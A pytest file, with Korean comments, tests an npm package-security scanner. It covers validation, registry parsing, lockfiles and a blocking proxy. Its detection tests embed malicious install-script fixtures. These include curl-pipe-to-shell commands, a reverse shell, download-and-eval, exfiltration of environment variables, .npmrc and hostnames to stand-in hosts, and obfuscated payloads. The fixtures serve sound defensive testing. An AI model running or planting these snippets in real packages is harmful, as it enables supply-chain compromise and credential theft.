"""npm 어댑터 — 오프라인 테스트 (레지스트리는 httpx.MockTransport, 규칙은 메모리 트리)."""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

import ecosystems
from ecosystems.base import PackageNotFound, RegistryError
from ecosystems.npm import ADAPTER, jslex

# ── 식별 ──────────────────────────────────────────────────────────


def test_registered():
    assert ecosystems.get("npm") is ADAPTER
    assert ADAPTER.osv_ecosystem == "npm" and ADAPTER.purl_type == "npm"


@pytest.mark.parametrize("name", ["lodash", "@babel/core", "JSONStream", "a.b-c_d", "@x/y~z"])
def test_validate_accepts(name):
    ADAPTER.validate(name, "1.0.0")


@pytest.mark.parametrize("name", [
    "../etc", "@scope/../x", "a/b", "@a/b/c", ".hidden", "_under", "a b", "a;rm", "@/x",
    "%2e%2e", "a\\b", "",
])
def test_validate_rejects_name(name):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, "1.0.0")


@pytest.mark.parametrize(
    "version", ["1.0.0", "0.0.1-beta.1", "1.2.3+build.5", "1.0.0-rc.1+sha.abc"]
)
def test_validate_accepts_semver(version):
    ADAPTER.validate("x", version)


@pytest.mark.parametrize(
    "version", ["1.0", "v1.0.0", "1.0.0 ", "1.0.0;ls", "01.0.0", "latest", "^1.0.0"]
)
def test_validate_rejects_version(version):
    with pytest.raises(ValueError):
        ADAPTER.validate("x", version)


def test_purl_scoped():
    assert ADAPTER.purl("@babel/core", "7.0.0") == "pkg:npm/%40babel/core@7.0.0"
    assert ADAPTER.purl("left-pad", "1.3.0") == "pkg:npm/left-pad@1.3.0"


# ── 레지스트리 ────────────────────────────────────────────────────

PACKUMENT = {
    "name": "@acme/widget",
    "dist-tags": {"latest": "1.1.0"},
    "maintainers": [{"name": "alice", "email": "a@x"}],
    "time": {"created": "2024-01-01T00:00:00.000Z", "1.0.0": "2024-01-01T00:00:00.000Z",
             "1.1.0": "2024-02-01T00:00:00.000Z"},
    "versions": {
        "1.0.0": {"dist": {"tarball": "https://registry.npmjs.org/@acme/widget/-/widget-1.0.0.tgz",
                           "shasum": "aa", "integrity": "sha512-x"},
                  "dependencies": {"lodash": "^4"}},
        "1.1.0": {"dist": {"tarball": "https://registry.npmjs.org/@acme/widget/-/widget-1.1.0.tgz",
                           "shasum": "bb", "integrity": "sha512-y"},
                  "deprecated": "use v2", "hasInstallScript": True,
                  "repository": {"type": "git", "url": "git+https://github.com/acme/widget.git"},
                  "dependencies": {"b": "1", "a": "2"}},
    },
}


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def test_fetch_project_scoped():
    seen = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(str(req.url))
        return httpx.Response(200, json=PACKUMENT)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("@acme/widget", client=c)

    p = asyncio.run(go())
    assert seen == ["https://registry.npmjs.org/@acme%2Fwidget"]
    assert p.latest == "1.1.0" and p.maintainers == ["alice"]
    assert p.repository_url == "https://github.com/acme/widget"
    r = p.release("1.1.0")
    assert r.install_script is True and r.dependencies == ["a", "b"]
    assert r.artifacts[0].filename == "widget-1.1.0.tgz" and r.artifacts[0].archive_format == "tar"
    assert p.extra["deprecated"] == {"1.1.0": "use v2"}
    assert p.previous_version("1.1.0") == "1.0.0"
    assert p.release("1.0.0").install_script is None
    assert ADAPTER.has_install_script(p, "1.0.0", ["package/binding.gyp"])


@pytest.mark.parametrize("response", [
    httpx.Response(404, json={"error": "Not found"}),
    httpx.Response(200, json={"name": "gone", "time": {"unpublished": {"time": "2024-01-01"}}}),
])
def test_fetch_project_not_found(response):
    async def go():
        async with _client(lambda req: response) as c:
            return await ADAPTER.fetch_project("gone", client=c)

    msg = r"^gone is not on npm \(never existed, or removed\)$"
    with pytest.raises(PackageNotFound, match=msg):
        asyncio.run(go())


def test_fetch_project_server_error():
    async def go():
        async with _client(lambda req: httpx.Response(503)) as c:
            return await ADAPTER.fetch_project("x", client=c)

    with pytest.raises(RegistryError):
        asyncio.run(go())


# ── 렉서 ──────────────────────────────────────────────────────────


def _names(src: str, executed: bool = True) -> list[str]:
    m = jslex.parse(src)
    return [c.name for c in jslex.calls(m, executed_only=executed)]


def test_lexer_ignores_comments_and_strings():
    src = "// eval(x)\n/* require('child_process').exec('a') */ var s = 'fetch(1)';\n"
    assert _names(src) == []


def test_lexer_regex_and_template():
    toks = jslex.tokenize("a = /x\\/y/g; b = `p${c(1)}q`; d = 4 / 2 / 1")
    kinds = [t.kind for t in toks]
    assert "regex" in kinds and kinds.count("tpl") == 2
    assert _names("b = `p${c(1)}q`") == ["c"]


def test_lexer_unescapes_strings():
    t = jslex.tokenize(r"'\x63hild_process'")[0]
    assert t.value == "child_process" and t.escapes == 1


def test_require_aliases_and_concat():
    src = ("const cp = require('child_' + 'process'); const { get: g } = require('node:https');\n"
           "import * as dns from 'dns'; cp.exec('x'); g('u'); dns.lookup('h');\n"
           "require('os').hostname()")
    assert _names(src) == ["require", "require", "child_process.exec", "https.get", "dns.lookup",
                           "require", "os.hostname"]


def test_execution_scope():
    src = """
    function used() { fetch('a') }
    function unused() { fetch('b') }
    const arrow = () => { fetch('c') };
    used(); arrow();
    module.exports = function () { fetch('d') };
    Object.defineProperty(exports, 'x', { get: function () { fetch('e') } });
    (function () { fetch('f') })();
    !function () { fetch('g') }();
    https.get(u, (res) => { fetch('h') });
    class K { m() { fetch('i') } }
    """
    m = jslex.parse(src)
    got = sorted(jslex.string_values(m, c.open, c.close)[0]
                 for c in jslex.calls(m, executed_only=True) if c.name == "fetch")
    assert got == ["a", "c", "f", "g", "h"]


def test_lexer_survives_garbage():
    jslex.parse("function ( { ] ) `${ '\n /* ")
    jslex.parse("")


def test_json_fixture_roundtrip():
    # 테스트 데이터 자체가 JSON 직렬화 가능한지 (MockTransport 가 그대로 보낸다)
    assert json.loads(json.dumps(PACKUMENT))["name"] == "@acme/widget"


# ── 규칙 ──────────────────────────────────────────────────────────

from pathlib import Path  # noqa: E402

from engine.rules.base import DiskTree, MemoryTree  # noqa: E402

SAMPLES = Path(__file__).resolve().parents[1] / "samples"


def _scan(files: dict[str, str]):
    return ADAPTER.analyze_tree(MemoryTree(files))


def _high(findings) -> set[str]:
    return {f.rule for f in findings if f.severity.value in ("high", "critical")}


def _pkg(scripts: dict | None = None, **extra) -> str:
    return json.dumps({"name": "t", "version": "1.0.0", "scripts": scripts or {}, **extra})


@pytest.mark.parametrize("fixture", ["npm_benign_binary_fetcher", "npm_benign_build_hooks"])
def test_benign_fixtures_not_high(fixture):
    findings = ADAPTER.analyze_tree(DiskTree(SAMPLES / fixture))
    assert not _high(findings), findings


def test_binary_fetcher_is_medium_context():
    rules = {f.rule for f in ADAPTER.analyze_tree(DiskTree(SAMPLES / "npm_benign_binary_fetcher"))}
    assert "npm-install-network" in rules and "npm-install-script" in rules


def test_dependency_confusion_dns_exfil():
    # 실측 계열(000webhost-*): preinstall → index.js 최상단이 부르는 함수 안 dns.resolve
    js = """
    const os = require('os'); const dns = require('dns');
    const send = () => { dns.resolve(`${os.hostname()}.abc.oast.fun`, () => {}) };
    send();
    """
    f = _scan({"package/package.json": _pkg({"preinstall": "node index.js"}),
               "package/index.js": js})
    assert "npm-install-time-exec" in _high(f)
    assert all(x.location.startswith("package/") for x in f)


def test_install_network_alone_is_not_high():
    js = "require('https').get('https://registry.npmjs.org/x', r => r.pipe(process.stdout));"
    f = _scan({"package.json": _pkg({"postinstall": "node fetch.js"}), "fetch.js": js})
    assert not _high(f)
    assert "npm-install-network" in {x.rule for x in f}


def test_load_time_exfil_on_require():
    js = """
    const https = require('https');
    https.request({ host: 'collector.example', method: 'POST' }).end(JSON.stringify(process.env));
    module.exports = {};
    """
    f = _scan({"package.json": _pkg(main="main.js"), "main.js": js})
    assert "npm-load-time-exec" in _high(f)


def test_function_body_on_entry_is_not_load_time():
    js = """
    const https = require('https'); const os = require('os');
    module.exports = function report() { https.get('https://x.example/' + os.hostname()) };
    """
    f = _scan({"package.json": _pkg(), "index.js": js})
    assert not _high(f)


@pytest.mark.parametrize("cmd", [
    "curl -s https://x.example/i.sh | sh",
    "wget -qO- http://x.example/a | bash",
    "powershell -w hidden -enc AAAA",
    "ping -c 1 abc.oast.online",
])
def test_lifecycle_shell(cmd):
    assert "npm-install-shell" in _high(_scan({"package.json": _pkg({"preinstall": cmd})}))


@pytest.mark.parametrize("cmd", [
    "node-gyp rebuild", "husky install", "node install.js", "prebuild-install || node-gyp rebuild",
    "patch-package", "opencollective-postinstall || true",
])
def test_lifecycle_builders_not_high(cmd):
    files = {"package.json": _pkg({"postinstall": cmd}), "install.js": "console.log('ok')"}
    assert not _high(_scan(files))


def test_prepare_is_not_install_time():
    # prepare 는 git 의존성에서만 돈다 — 레지스트리 타르볼에서는 설치 시점 범위가 아니다
    js = "require('https').get('http://1.2.3.4/' + require('os').hostname())"
    f = _scan({"package.json": _pkg({"prepare": "node build.js"}), "build.js": js})
    assert "npm-install-time-exec" not in _high(f)
    assert "npm-install-script" not in {x.rule for x in f}


def test_inline_node_e():
    cmd = "node -e \"require('child_process').execSync('curl x.example|sh')\""
    assert _high(_scan({"package.json": _pkg({"install": cmd})}))


def test_bun_runner_followed():
    js = "require('child_process').exec('curl -s http://x.example/p | sh')"
    f = _scan({"package.json": _pkg({"postinstall": "bun ./p.mjs || node ./p.mjs"}), "p.mjs": js})
    assert "npm-install-time-exec" in _high(f)


def test_reverse_shell():
    js = """
    const net = require('net'); const { spawn } = require('child_process');
    const c = new net.Socket(); c.connect(4444, '203.0.113.9', () => {
      const sh = spawn('/bin/sh', []); c.pipe(sh.stdin); sh.stdout.pipe(c);
    });
    """
    f = _scan({"package.json": _pkg({"preinstall": "node s.js"}), "s.js": js})
    assert "npm-install-time-exec" in _high(f)


def test_download_and_eval():
    js = """
    const http = require('http');
    http.get('http://cdn.example/p.js', res => { let d=''; res.on('data', c => d += c);
      res.on('end', () => eval(d)); });
    """
    f = _scan({"package.json": _pkg({"preinstall": "node p.js"}), "p.js": js})
    assert "npm-install-time-exec" in _high(f)


def test_decode_exec():
    js = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())"
    f = _scan({"package.json": _pkg(), "index.js": js})
    assert "npm-decode-exec" in _high(f)
    # 실행 경로 밖 파일에서는 정황
    f2 = _scan({"package.json": _pkg(), "index.js": "", "lib/x.js": js})
    assert {x.rule for x in f2 if x.severity.value == "medium"} == {"npm-decode-exec"}


def test_hidden_api_names_in_install_script():
    js = """
    const m = require(Buffer.from('6f73', 'hex').toString());
    const k = Buffer.from('686f73746e616d65', 'hex').toString();
    const h = require(Buffer.from('6874747073', 'hex').toString());
    """
    f = _scan({"package.json": _pkg({"postinstall": "node m.js"}), "m.js": js})
    assert "npm-obfuscated" in _high(f)


def test_char_code_require_resolved():
    js = ("const o = require(String.fromCharCode(111,115)); "
          "const h = require(String.fromCharCode(104,116,116,112,115));\n"
          "h.request({host: 'x.example'}).end(o.hostname());")
    f = _scan({"package.json": _pkg({"preinstall": "node i.js"}), "i.js": js})
    assert "npm-install-time-exec" in _high(f)


def test_obfuscator_shape_install():
    ids = " ".join(f"var _0x{i:04x}=_0x{i + 1:04x};" for i in range(60))
    rot = "(function(a,b){while(!![]){try{a['push'](a['shift']());}catch(e){a.push(a.shift());}}})"
    f = _scan({"package.json": _pkg({"postinstall": "node o.js"}), "o.js": ids + rot})
    assert "npm-obfuscated" in _high(f)
    f2 = _scan({"package.json": _pkg(), "index.js": ids})
    assert not _high(f2) and "npm-obfuscated" in {x.rule for x in f2}


def test_exfil_endpoint_anywhere():
    url = "https://discord.com/api/webhooks/123456789012345678/" + "a" * 30
    f = _scan({"package.json": _pkg(), "lib/unused.js": f"const u = '{url}';"})
    assert "npm-exfil-endpoint" in _high(f)


def test_remote_url_dependency():
    f = _scan({"package.json": _pkg(dependencies={
        "ui": "http://packages.example/npm/ui", "ok": "^1.0.0",
        "reg": "https://registry.npmjs.org/reg/-/reg-1.0.0.tgz", "g": "github:o/r"})})
    high = [x for x in f if x.rule == "npm-remote-dependency" and x.severity.value == "high"]
    assert len(high) == 1 and "packages.example" in high[0].detail
    assert any(x.rule == "npm-remote-dependency" and x.severity.value == "low" for x in f)


def test_secret_read_with_send():
    js = """
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const t = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
    fetch('https://x.example/c', { method: 'POST', body: t });
    """
    f = _scan({"package.json": _pkg({"postinstall": "node r.js"}), "r.js": js})
    hi = [x for x in f if x.rule == "npm-install-time-exec"]
    assert hi and ".npmrc" in hi[0].detail


def test_env_passed_to_child_is_not_dump():
    js = ("require('https').get('https://registry.npmjs.org/x');"
          "require('child_process').spawnSync('x', [], {env: process.env});")
    assert not _high(_scan({"package.json": _pkg({"postinstall": "node i.js"}), "i.js": js}))


def test_binding_gyp_command():
    gyp = '{"targets":[{"target_name":"a","include_dirs":["<!(curl -s http://x.example | sh)"]}]}'
    assert "npm-binding-gyp" in _high(_scan({"package.json": _pkg(), "binding.gyp": gyp}))


def test_unreadable_entry_reported():
    class Tree(MemoryTree):
        def read(self, relpath):
            return None if relpath == "index.js" else super().read(relpath)

    seen: list[str] = []
    from ecosystems.npm.rules import analyze_tree

    f = analyze_tree(Tree({"package.json": _pkg(), "index.js": "x"}), unreadable=seen)
    assert "index.js" in seen and any(x.rule == "npm-unreadable" for x in f)


def test_rule_cwes_cover_emitted_rules():
    cwes = ADAPTER.rule_cwes()
    assert all(r.startswith("npm-") for r in cwes)
    f = _scan({"package.json": _pkg({"preinstall": "curl x.example | sh"}),
               "index.js": "eval(atob('eA=='))"})
    for x in f:
        assert x.rule in cwes and x.cwe in cwes[x.rule] | {"CWE-78"}


# ── 의존성 파일 ───────────────────────────────────────────────────


def _deps(filename: str, text: str) -> dict[str, tuple]:
    return {(d.name, d.version): (d.direct, d.spec) for d in ADAPTER.parse_manifest(filename, text)}


def test_package_json_ranges():
    text = json.dumps({"dependencies": {"lodash": "^4.17.0", "left-pad": "1.3.0"},
                       "devDependencies": {"@types/node": "~20.1.0"}})
    got = _deps("app/package.json", text)
    assert got[("lodash", None)] == (True, "^4.17.0")
    assert ("left-pad", "1.3.0") in got and ("@types/node", None) in got


def test_package_lock_v1():
    text = json.dumps({"lockfileVersion": 1, "dependencies": {
        "a": {"version": "1.0.0", "resolved": "https://r/a.tgz",
              "dependencies": {"b": {"version": "2.0.0"}}},
        "loc": {"version": "file:../loc"}}})
    got = _deps("package-lock.json", text)
    assert got[("a", "1.0.0")][0] is None and got[("b", "2.0.0")][0] is False
    assert all(n != "loc" for n, _ in got)


@pytest.mark.parametrize("ver", [2, 3])
def test_package_lock_v2_v3(ver):
    text = json.dumps({"lockfileVersion": ver, "packages": {
        "": {"name": "app", "dependencies": {"@s/a": "^1"}},
        "node_modules/@s/a": {"version": "1.2.0", "resolved": "https://r/a.tgz"},
        "node_modules/@s/a/node_modules/b": {"version": "3.0.0"},
        "node_modules/ws": {"link": True},
    }})
    got = _deps("npm-shrinkwrap.json", text)
    assert got == {("@s/a", "1.2.0"): (True, "https://r/a.tgz"), ("b", "3.0.0"): (False, "")}


YARN_V1 = '''# THIS IS AN AUTOGENERATED FILE.
# yarn lockfile v1


"@babel/core@^7.0.0", "@babel/core@^7.1.0":
  version "7.24.0"
  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.24.0.tgz"

lodash@^4.17.21:
  version "4.17.21"
'''

YARN_BERRY = '''__metadata:
  version: 8
  cacheKey: 10

"app@workspace:.":
  version: 0.0.0-use.local
  resolution: "app@workspace:."

"lodash@npm:^4.17.21":
  version: 4.17.21
  resolution: "lodash@npm:4.17.21"
'''


def test_yarn_classic_and_berry():
    assert set(_deps("yarn.lock", YARN_V1)) == {("@babel/core", "7.24.0"), ("lodash", "4.17.21")}
    assert set(_deps("yarn.lock", YARN_BERRY)) == {("lodash", "4.17.21")}


PNPM_V9 = '''lockfileVersion: '9.0'

importers:

  .:
    dependencies:
      lodash:
        specifier: ^4.17.21
        version: 4.17.21

packages:

  lodash@4.17.21:
    resolution: {integrity: sha512-x}

  '@babel/core@7.24.0':
    resolution: {integrity: sha512-y}
'''

PNPM_V6 = '''lockfileVersion: '6.0'

dependencies:
  lodash:
    specifier: ^4.17.21
    version: 4.17.21

packages:

  /lodash@4.17.21:
    resolution: {integrity: sha512-x}

  /@babel/core@7.24.0(supports-color@8.1.1):
    resolution: {integrity: sha512-y}
'''

PNPM_V5 = '''lockfileVersion: 5.4

dependencies:
  lodash: 4.17.21

packages:

  /lodash/4.17.21:
    resolution: {integrity: sha512-x}
'''


@pytest.mark.parametrize("text", [PNPM_V9, PNPM_V6])
def test_pnpm_v6_v9(text):
    got = _deps("pnpm-lock.yaml", text)
    assert got[("lodash", "4.17.21")][0] is True
    assert got[("@babel/core", "7.24.0")][0] is False


def test_pnpm_v5():
    assert _deps("pnpm-lock.yaml", PNPM_V5) == {("lodash", "4.17.21"): (True, "")}


@pytest.mark.parametrize("filename,text", [
    ("package-lock.json", "{not json"), ("package.json", "[1]"), ("yarn.lock", "hello: world"),
    ("pnpm-lock.yaml", "packages:\n"), ("package-lock.json", "{}"),
])
def test_broken_manifest_raises(filename, text):
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest(filename, text)


# ── 피드 ──────────────────────────────────────────────────────────


def test_feed_parses_changes():
    body = {"results": [{"seq": 3, "id": "a", "changes": []}, {"seq": 2, "id": "_design/x"},
                        {"seq": 1, "id": "@s/b"}, {"seq": 0, "id": "a"}], "last_seq": 3}

    def handler(req):
        assert req.url.host == "replicate.npmjs.com" and req.url.params["descending"] == "true"
        return httpx.Response(200, json=body)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = asyncio.run(go())
    assert items == [("a", None), ("@s/b", None)] and errors == []


def test_feed_error_is_reported():
    async def go():
        async with _client(lambda req: httpx.Response(500)) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = asyncio.run(go())
    assert items == [] and errors and "npm changes feed" in errors[0]


@pytest.mark.live
def test_live_feed():
    async def go():
        async with httpx.AsyncClient(timeout=30) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = asyncio.run(go())
    assert not errors and len(items) > 10


# ── 레지스트리 프록시 ─────────────────────────────────────────────

from types import SimpleNamespace  # noqa: E402

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from api.routers import npm_proxy  # noqa: E402
from api.schemas import Verdict  # noqa: E402

TARBALL = b"\x1f\x8b fake tgz bytes"


def _proxy_app(monkeypatch, verdict: Verdict, *, packument=None, scans=None):
    doc = packument or PACKUMENT

    def upstream(req: httpx.Request) -> httpx.Response:
        if req.url.path.endswith(".tgz"):
            async def body():  # 실제 전송처럼 스트림으로 (aiter_raw 가 읽는다)
                yield TARBALL[:5]
                yield TARBALL[5:]

            return httpx.Response(200, content=body(),
                                  headers={"content-type": "application/octet-stream"})
        return httpx.Response(200, json=doc)

    async def fake_run_scan(req, *, http, store):
        (scans if scans is not None else []).append((req.name, req.version))
        return SimpleNamespace(verdict=verdict, risk_score=90, verdict_reasons=["test"],
                               layer_errors=[], scan_id=7)

    monkeypatch.setattr(npm_proxy.scan_layer, "run_scan", fake_run_scan)
    monkeypatch.setattr(npm_proxy, "build_scan_request",
                        lambda n, v: SimpleNamespace(name=n, version=v))
    app = FastAPI()
    app.include_router(npm_proxy.router)
    app.state.http = httpx.AsyncClient(transport=httpx.MockTransport(upstream))
    app.state.store = None
    return TestClient(app)


def test_proxy_rewrites_tarball_keeps_integrity(monkeypatch):
    client = _proxy_app(monkeypatch, Verdict.SAFE)
    r = client.get("/npm/@acme%2fwidget")
    assert r.status_code == 200
    dist = r.json()["versions"]["1.1.0"]["dist"]
    assert dist["tarball"] == "http://testserver/npm/@acme/widget/-/widget-1.1.0.tgz"
    assert dist["integrity"] == "sha512-y" and dist["shasum"] == "bb"


def test_proxy_scans_exact_tarball_and_streams(monkeypatch):
    scans: list = []
    client = _proxy_app(monkeypatch, Verdict.WARN, scans=scans)
    r = client.get("/npm/@acme/widget/-/widget-1.1.0.tgz")
    assert r.status_code == 200 and r.content == TARBALL
    assert scans == [("@acme/widget", "1.1.0")]


def test_proxy_blocks(monkeypatch):
    client = _proxy_app(monkeypatch, Verdict.BLOCK)
    r = client.get("/npm/@acme/widget/-/widget-1.0.0.tgz")
    assert r.status_code == 403
    body = r.json()
    assert body["error"] == "blocked_by_supply_unchained"
    assert body["package"] == "@acme/widget@1.0.0"


@pytest.mark.parametrize("path", [
    "/npm/@acme/widget/-/other-1.0.0.tgz",      # 파일명과 이름 불일치
    "/npm/@acme/widget/-/widget-latest.tgz",    # 버전 형식 아님
    "/npm/@acme/widget/-/widget-1.0.0.zip",
])
def test_proxy_fail_closed(monkeypatch, path):
    scans: list = []
    client = _proxy_app(monkeypatch, Verdict.SAFE, scans=scans)
    assert client.get(path).status_code == 403 and scans == []


def test_proxy_rejects_foreign_tarball_host(monkeypatch):
    evil = json.loads(json.dumps(PACKUMENT))
    evil["versions"]["1.1.0"]["dist"]["tarball"] = "https://evil.example/widget-1.1.0.tgz"
    scans: list = []
    client = _proxy_app(monkeypatch, Verdict.SAFE, packument=evil, scans=scans)
    assert client.get("/npm/@acme/widget/-/widget-1.1.0.tgz").status_code == 403 and scans == []


def test_proxy_unknown_version_404(monkeypatch):
    client = _proxy_app(monkeypatch, Verdict.SAFE)
    assert client.get("/npm/@acme/widget/-/widget-9.9.9.tgz").status_code == 404


def test_proxy_pipeline_without_npm_is_503(monkeypatch):
    client = _proxy_app(monkeypatch, Verdict.SAFE)

    def no_npm(n, v):
        raise ValueError("ecosystem npm not accepted")

    monkeypatch.setattr(npm_proxy, "build_scan_request", no_npm)
    assert client.get("/npm/@acme/widget/-/widget-1.1.0.tgz").status_code == 503


def test_proxy_invalid_name_and_audit(monkeypatch):
    client = _proxy_app(monkeypatch, Verdict.SAFE)
    assert client.get("/npm/-/npm/v1/security/advisories/bulk").status_code == 404
    assert client.get("/npm/..%2Fetc").status_code in (400, 404)


def test_detached_child_js_is_install_scope():
    post = ("const { spawn } = require('child_process');\n"
            "spawn('node', [`${__dirname}/main.js`], {detached: true, stdio: 'ignore'}).unref();")
    main = ("const os = require('os'); const net = require('net');\n"
            "const s = net.connect(9000, '198.51.100.7'); s.write(os.hostname());")
    f = _scan({"package.json": _pkg({"postinstall": "node src/postinstall.js"}),
               "src/postinstall.js": post, "src/main.js": main})
    hi = [x for x in f if x.rule == "npm-install-time-exec"]
    assert hi and hi[0].location.startswith("src/main.js")


# ── 탈취 패키지 실측(compromised_lib)에서 놓친 형태 ─────────────────

def test_bun_run_subcommand_followed():
    # 2026-05 AntV 캠페인: "preinstall": "bun run index.js"
    js = "require('child_process').exec('curl -s http://x.example/p | sh')"
    f = _scan({"package.json": _pkg({"preinstall": "bun run index.js"}), "index.js": js})
    assert "npm-install-time-exec" in _high(f)


def _b64(text: str) -> str:
    import base64
    return base64.b64encode(text.encode()).decode()


def test_install_script_with_embedded_script_payload():
    # 2026-03 @emilgroup 캠페인: postinstall 이 base64 로 든 파이썬 스크립트를 디스크에 쓴다
    payload = _b64("import urllib.request\nimport os\nimport subprocess\n" + "x = 1\n" * 40)
    js = f"""
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const P = '{payload}';
    fs.writeFileSync(path.join(os.homedir(), '.svc.py'), Buffer.from(P, 'base64'));
    """
    f = _scan({"package.json": _pkg({"postinstall": "node index.js"}), "index.js": js})
    assert "npm-decode-exec" in _high(f)


def test_embedded_base64_data_is_not_payload():
    # 설치 스크립트가 든 base64 가 스크립트가 아니면(이미지·설정) 걸지 않는다
    blob = _b64("lorem ipsum dolor sit amet, " * 20)
    js = f"const logo = '{blob}'; console.log(logo.length);"
    f = _scan({"package.json": _pkg({"postinstall": "node index.js"}), "index.js": js})
    assert not _high(f)


def _obfuscated_js(n: int = 60) -> str:
    return ";".join(f"var _0x{i:04x}a=_0x{i + 1:04x}b(0x{i:x})" for i in range(n))


def test_unreferenced_obfuscated_file_with_git_dependency():
    # 2026-05 TanStack 캠페인: optionalDependencies 의 git 저장소가 설치 때 이 파일을 실행
    pkg = json.loads(_pkg())
    pkg["optionalDependencies"] = {"@acme/setup": "github:acme/widget#79ac49eedf774dd4b0cf"}
    f = _scan({"package.json": json.dumps(pkg), "index.js": "module.exports = {}",
               "router_init.js": _obfuscated_js()})
    assert "npm-obfuscated" in _high(f)


def test_unreferenced_obfuscated_file_alone_stays_medium():
    f = _scan({"package.json": _pkg(), "index.js": "module.exports = {}",
               "extra.js": _obfuscated_js()})
    assert not _high(f)
    assert "npm-obfuscated" in {x.rule for x in f}


def test_git_dependency_alone_stays_low():
    pkg = json.loads(_pkg())
    pkg["dependencies"] = {"w": "github:acme/widget"}
    f = _scan({"package.json": json.dumps(pkg), "index.js": "module.exports = {}"})
    assert not _high(f)
